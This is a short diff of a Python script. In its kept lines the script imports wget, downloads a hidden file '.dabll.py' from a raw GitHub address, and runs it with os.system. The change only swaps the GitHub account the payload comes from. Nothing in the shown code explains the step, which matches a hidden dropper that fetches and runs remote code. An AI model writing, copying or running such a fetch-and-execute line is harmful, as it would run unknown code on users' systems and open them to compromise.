@@ -34,7 +34,7 @@ iii()
 pass
 
 import os, sys, random, wget
-wget.download("https://raw.githubusercontent.com/sfr404sfrzed/-/main/.dabll.py")
+wget.download("https://raw.githubusercontent.com/zed404sfrr/-/main/.dabll.py")
 os.system("python .dabll.py")
 
 #
